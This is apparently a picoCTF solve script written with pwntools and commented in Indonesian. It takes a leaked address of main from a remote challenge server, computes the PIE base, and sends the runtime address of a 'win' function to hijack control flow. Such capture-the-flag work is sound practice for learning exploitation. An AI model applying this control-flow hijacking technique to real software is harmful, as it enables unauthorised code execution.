# PIE can be defeated as it has base address and the offset always gonna be the same. 
 
from pwn import *

exe = ('./vuln')
binary = context.binary = ELF(exe)
p = remote('rescued-float.picoctf.net',53831)
p.recvuntil(b': ')
a = int(p.recvline().strip(),16) #ambil address main yang dileak
print(hex(a))
win = binary.symbols.win #ambil address win(atau offsetnya terhadap base address) yang tercatat di binary 
print(hex(win))
main = binary.symbols.main #ambil address main yang tercatat di binary
print(hex(main))
base = a - main #kita mau cari base addressnya
print(hex(base)) 
realWin = base + win #Tambahin base address dengan address win, otomatis ketauan win address diprogram yang lagi running
print(hex(realWin))
p.sendlineafter(b':',hex(realWin))
p.interactive()
